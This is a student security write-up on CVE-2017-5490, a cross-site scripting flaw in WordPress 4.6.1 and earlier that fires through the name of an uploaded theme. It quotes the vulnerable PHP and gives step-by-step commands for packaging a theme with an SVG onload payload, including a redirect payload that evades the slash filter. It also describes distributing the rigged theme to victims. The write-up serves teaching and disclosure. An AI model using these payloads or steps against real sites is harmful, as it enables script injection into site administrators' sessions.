# Cross-site scripting (XSS) via theme name fallback
## Description:
The vulnerability (CVE-2017-5490) exists in Wordpress version 4.6.1 and prior releases, it can be exploited by inserting payload in the name of a file that contains a Wordpress Theme. As shown below, this Vulnerability exists as a resut of the use of the variable `$name` that gets its value from the name of the file containing the Downloaded theme.
``` php
$theme_info = $this->upgrader->theme_info();
if ( empty( $theme_info ) )
   return;
$name       = $theme_info->display('Name');
```
### Vulnerable Code:
``` php
if ( current_user_can( 'edit_theme_options' ) && current_user_can( 'customize' ) ) {
			$install_actions['preview'] = '<a href="' . wp_customize_url( $stylesheet ) . '" class="hide-if-no-customize load-customize"><span aria-hidden="true">' . __( 'Live Preview' ) . '</span><span class="screen-reader-text">' . sprintf( __( 'Live Preview &#8220;%s&#8221;' ), $name ) . '</span></a>';
		}
		$install_actions['activate'] = '<a href="' . esc_url( $activate_link ) . '" class="activatelink"><span aria-hidden="true">' . __( 'Activate' ) . '</span><span class="screen-reader-text">' . sprintf( __( 'Activate &#8220;%s&#8221;' ), $name ) . '</span></a>';
```
### Significance:
This vunerability is considered to be of low significance/severity, this is because it requires the upload of a theme from a super user or admin. Additionaly, the XSS payload cannot be placed as a folder name in Windows, therefore this Vulnerability only affects Wordpress when deployed on Linux.   
However, there are still multiple scenarios where this vulnerbility can still be exploited, for example:   
* Downloading themes from malicious/untrusted websites.
* Sending a theme with payload to a website admin to implement.
* Making a website with a theme with payload that can affect anyone who visits the website.   

## Designed Attack:
### Steps to conduct the attack:  
 1. Download a theme:   
    This attack doesn't require the download of a specific theme, therefore, we can download any theme of our choice.

2. Unzip/Extract the theme:   
    Since themes are downloaded as a `.zip` folder, we first need to unzip the folder to continue with the next steps. To do so from the command line, we `cd` to the directory where the theme was downloaded, and run the following command:  
    ``` 
    unzip -x ThemeName.zip
    ```

3. Insert the payload:   
    To Insert the payload we need to perform the following steps:  
    1. Open `style.css` from `ThemeName/style.css`   
       To do so from the command line, we `cd` to the directory `ThemeName` and run the following command:  
       ``` 
       nano style.css
       ```
    2. Edit the `style.css` file:
       Change the line with "`Them Name:`" to the following:
       ``` 
       Theme Name: <svg onload=alert(1)>
       ```
    3. Change the directory's name:
    To do so from the command line we run the following command:
       ``` 
       mv ThemeName "<svg onload=alert(1)>"
       ```

4. Zip/Compress the folder:  
    To do so from the command line we run the command below:
    ```
    zip -r NewName.zip "<svg onload=alert(1)>"
    ```
    
5. Upload the theme:  
    Now we upload the theme to Wordpress. 

## Sample Attack Demonstration:

### _Attacker:_

To conduct the attack, I first need to construct the malicious theme. To do so, I download any [WP theme](https://wordpress.org/themes/).


![DownloadTheme](https://github.com/ualbany-csi524-f22/project-team2/blob/main/Moemen%20Elmegahed/CVE-2017-5490/Screenshots/DownloadTheme.png) 

I then unzip the downloaded file, and go to ThemeName/style.css and change the Theme name to the malicious code.   
For the sake of the demonstration, our malicious code will redirect the user to a Rickroll youtube video.   
We can achive this by using the `onload` HTML Event and `String.fromCharCode(47)` to replace the slash(`/`) in the link since file names cannot include them.  
**Malicious code:**
``` HTML
<svg onload=location.replace("http:"+String.fromCharCode(47)+String.fromCharCode(47)+"www.youtube.com"+String.fromCharCode(47)+"watch?v=dQw4w9WgXcQ")>
```

![style-before](https://github.com/ualbany-csi524-f22/project-team2/blob/main/Moemen%20Elmegahed/CVE-2017-5490/Screenshots/style-before.png) 

![style-after](https://github.com/ualbany-csi524-f22/project-team2/blob/main/Moemen%20Elmegahed/CVE-2017-5490/Screenshots/style-after.png) 

I then change the name of the unzipped file to the malicious code:

![FileName-before](https://github.com/ualbany-csi524-f22/project-team2/blob/main/Moemen%20Elmegahed/CVE-2017-5490/Screenshots/FileName-before.png) 

![FileName-after](https://github.com/ualbany-csi524-f22/project-team2/blob/main/Moemen%20Elmegahed/CVE-2017-5490/Screenshots/FileName-after.png) 

I then compress the file and name it `theme.zip`:

![ZipTheFile](https://github.com/ualbany-csi524-f22/project-team2/blob/main/Moemen%20Elmegahed/CVE-2017-5490/Screenshots/ZipTheFile.png) 

Next, I Upload the file to a malicious website for anyone to download and use:

![UploadTheFile](https://github.com/ualbany-csi524-f22/project-team2/blob/main/Moemen%20Elmegahed/CVE-2017-5490/Screenshots/UploadTheFile.png) 

### _Victim:_
As the victim, I download the Theme from the malicious Website, and upload it to my wordpress website:

![UploadTheme](https://github.com/ualbany-csi524-f22/project-team2/blob/main/Moemen%20Elmegahed/CVE-2017-5490/Screenshots/UploadTheme.png) 

I then instantly get redicected to the Rickroll video:

![Rickroll](https://github.com/ualbany-csi524-f22/project-team2/blob/main/Moemen%20Elmegahed/CVE-2017-5490/Screenshots/Rickroll.png) 



## Video Demonstration:
[Click here](https://www.screencast.com/users/moemen.el/folders/Capture/media/da659b67-de07-42b1-9aa6-9425defadd7a) for a video demonstration of the attack.
